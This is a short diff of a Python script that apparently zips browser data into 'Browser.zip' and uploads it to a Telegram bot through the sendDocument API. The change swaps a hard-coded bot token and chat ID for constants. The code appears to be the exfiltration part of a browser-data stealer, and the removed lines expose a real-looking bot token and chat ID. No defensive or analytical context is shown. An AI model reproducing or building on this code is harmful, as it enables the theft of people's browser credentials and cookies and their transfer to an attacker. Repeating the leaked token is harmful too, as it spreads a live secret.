@@ -226,8 +226,8 @@ def compress_files_data_to_zip(output_zip="Browser.zip"):
     
 def send_file_to_bot(file_path, link):
     try:
-        token = "7697564639:AAGf7Fx8q8FZKCuUT4GjsIXUwOQESOO7M9g"
-        chat_id = "6186621815"
+        token = TOKEN
+        chat_id = CHAT_ID
         url = f"https://api.telegram.org/bot{token}/sendDocument"
         with open(file_path, 'rb') as file:
             data = {
